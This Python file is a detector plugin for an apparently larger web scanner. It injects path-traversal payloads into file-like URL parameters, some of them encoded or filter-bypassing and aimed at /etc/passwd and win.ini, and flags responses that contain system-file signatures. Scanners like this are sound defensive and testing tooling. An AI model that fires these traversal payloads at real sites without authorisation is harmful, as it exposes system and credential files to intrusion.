"""目录遍历/任意文件读取检测插件（确定性规则）。"""
from __future__ import annotations

import re

from ..base import DetectorPlugin, ScanContext, SuspectFinding
from ..http_client import http_request, extract_query_params, extract_links, get
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse, urljoin

# 文件读取目标与判定特征
_TRAVERSAL_TARGETS = (
    ("../../../../../../etc/passwd", re.compile(r"root:[x*]:0:0:")),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", re.compile(
        r"\[fonts\]|\[extensions\]", re.I)),
    ("....//....//....//....//etc/passwd", re.compile(r"root:[x*]:0:0:")),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", re.compile(r"root:[x*]:0:0:")),
)

# 常见文件参数名
_FILE_PARAMS = ("file", "path", "page", "tpl", "template", "include",
                "read", "doc", "download", "show", "view", "lang", "load")


class PathTraversalPlugin(DetectorPlugin):
    id = "traversal.file_read"
    vuln_type = "path_traversal"
    name = "目录遍历/任意文件读取"
    description = "文件参数注入穿越序列，命中系统文件指纹即疑似"
    default_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"

    def match(self, fp) -> bool:
        # 有 PHP/JSP/动态参数的站更容易命中；其余也可探测（webserver 无关）
        return True

    async def detect(self, ctx: ScanContext) -> list[SuspectFinding]:
        findings: list[SuspectFinding] = []

        # 候选注入 URL：带文件类参数的 URL 优先，否则用常见参数打首页
        candidates: list[tuple[str, str]] = []  # (url, param)
        seen = set()

        urls = [ctx.base_url]
        root = f"{urlparse(ctx.base_url).scheme}://{urlparse(ctx.base_url).netloc}"
        for p in ctx.fp.paths[:15]:
            if not re.search(r"\.(js|css|png|jpg|jpeg|gif|ico|svg)$", p, re.I):
                urls.append(urljoin(root, p))

        for u in urls:
            qs = extract_query_params(u)
            for k in qs:
                if k.lower() in _FILE_PARAMS or qs[k].endswith((".php", ".html", ".jsp", ".txt", ".ini")):
                    key = (u, k)
                    if key not in seen:
                        seen.add(key)
                        candidates.append(key)

        for k in _FILE_PARAMS:
            key = (ctx.base_url, k)
            if key not in seen:
                candidates.append(key)

        for url, param in candidates[:20]:
            for payload, sig in _TRAVERSAL_TARGETS:
                parsed = urlparse(url)
                new_qs = [(kk, payload if kk == param else vv)
                          for kk, vv in parse_qsl(parsed.query, keep_blank_values=True)]
                if not any(kk == param for kk, _ in new_qs):
                    new_qs.append((param, payload))
                probe_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                r = await http_request("GET", probe_url, timeout=8)
                if r.status and r.text and sig.search(r.text[:60000]):
                    findings.append(SuspectFinding(
                        plugin_id=self.id, vuln_type=self.vuln_type,
                        title=f"目录遍历/任意文件读取：参数 {param}",
                        detail=(f"参数 {param} 注入穿越序列 "
                                f"{payload!r} 后，响应命中系统文件指纹"
                                f"（{'win.ini' if 'fonts' in sig.pattern else '/etc/passwd'}），"
                                f"文件路径未做归一化校验。"),
                        payload=f"{param}={payload}",
                        evidence=sig.search(r.text[:60000]).group(0),
                        url=probe_url, param=param,
                        vector=self.default_vector, confidence=0.8,
                    ))
                    break
        return findings

    async def verify(self, ctx: ScanContext,
                     finding: SuspectFinding) -> SuspectFinding | None:
        """独立复现：重读一次文件，指纹仍在才确认。"""
        import asyncio
        await asyncio.sleep(0.5)
        r = await http_request("GET", finding.url, timeout=8)
        if r.status and r.text and (
                re.search(r"root:[x*]:0:0:", r.text[:60000])
                or re.search(r"\[fonts\]|\[extensions\]", r.text[:60000], re.I)):
            finding.verified = True
            finding.verify_evidence = f"复现: 系统文件指纹再次命中 ({r.status})"
            finding.confidence = min(0.92, finding.confidence + 0.12)
            return finding
        return None
